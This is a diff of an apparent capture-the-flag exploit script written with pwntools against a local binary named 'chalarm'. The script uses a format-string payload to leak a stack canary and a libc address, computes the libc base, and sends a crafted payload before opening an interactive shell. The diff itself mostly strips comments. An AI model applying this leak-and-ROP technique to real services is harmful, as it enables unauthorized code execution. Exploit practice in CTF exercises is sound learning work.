@@ -1,7 +1,5 @@
 from pwn import *
-import os
 
-#os.environ['LD_LIBRARY_PATH'] = '.'
 context.terminal = ['tmux', 'split-window', '-h']
 
 elf = context.binary = ELF('chalarm')
@@ -17,10 +15,8 @@ p = remote('localhost', 5000)
 
 p.sendlineafter(b'2. Legs\n', b'1')
 p.sendlineafter(b'of?\n', b'1337')
-# These are leaks for chal with pie
 p.sendlineafter(b'appendage? ', b'%13$p%21$p%19$p')
-# the below was for chal with pie
-#p.sendlineafter(b'appendage? ', b'%23$p%21$p%19$p')
+
 p.recv()
 leaks = p.recv().split(b'0x')
 # main is at the 23rd offset
@@ -32,8 +28,7 @@ libc_start_main = int(libc_start_main_leak, 16) - 152
 
 canaryleak = leaks[3].split(b'\n')[0]
 canary = int(canaryleak, 16)
-#elf_base = main - elf.symbols.main
-#elf.address = elf_base
+
 libc.address = libc_start_main - libc.symbols['__libc_start_main']
 print(leaks)
 print(hex(canary))
@@ -59,6 +54,5 @@ payload = flat([
 
 ])
 
-#p.sendlineafter(b'feedback?!', payload)
 p.sendline(payload)
 p.interactive()
